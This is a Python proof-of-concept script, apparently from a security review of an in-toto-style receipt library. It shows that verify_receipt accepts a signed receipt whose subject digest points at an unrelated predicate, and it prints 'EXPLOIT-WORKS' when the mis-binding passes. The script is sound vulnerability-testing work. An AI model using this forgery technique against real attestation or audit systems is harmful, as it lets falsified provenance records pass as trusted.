#!/usr/bin/env python3
"""PoC 11 — Subject-digest mis-binding by the signer PASSes (A14 only
covered post-signing drift).

verify_receipt never recomputes sha256(canonical(predicate)) against
subject.digest.sha256; the digest is only protected by the signature, which
the signer controls. A receipt can therefore claim to bind subject
"prod:payment-service" with a digest of a completely different predicate and
still PASS — breaking the in-toto subject link any layout would rely on.
S2.6.
"""
import sys
sys.path.insert(0, "/home/user/workspace/governance-as-code/tools")
from receipt_lib import (generate_keypair, verify_receipt, canonical,
                         sha256_hex, sign, keyid, PREDICATE_TYPE)

sk, pk = generate_keypair()

predicate = {
    "action_id": "a-1",
    "actor": {"type": "human", "id": "s.lutar", "is_service_account": False,
              "auth_method": "hardware_key", "human_principal": "Stephen P. Lutar"},
    "policy_decision": {"result": "ALLOW"},
    "execution": {"status": "EXECUTED"},
    "evidence": {"items": [{"id": "log", "sha256": sha256_hex(b"x"), "present": True}],
                 "completeness": "COMPLETE", "redaction_commitments": []},
    "timestamps": {"created": "2026-08-30T00:00:00+00:00",
                   "executed": "2026-08-30T00:00:00+00:00", "ntp_synced": True},
    "prev_chain_hash": "GENESIS",
}

# Digest and name deliberately point somewhere else.
stmt = {"predicateType": PREDICATE_TYPE,
        "subject": {"name": "prod:payment-service",
                    "digest": {"sha256": sha256_hex(canonical({"completely": "different predicate"}))}},
        "predicate": predicate}
payload = canonical(stmt)
stmt["signatures"] = [{"keyid": keyid(sk.public_key()),
                       "sig": sign(sk, PREDICATE_TYPE, payload)}]

v = verify_receipt(stmt, pk)
mismatch = stmt["subject"]["digest"]["sha256"] != sha256_hex(canonical(predicate))

print("EXPLOIT-WORKS" if (v.verdict == "PASS" and mismatch) else "HELD")
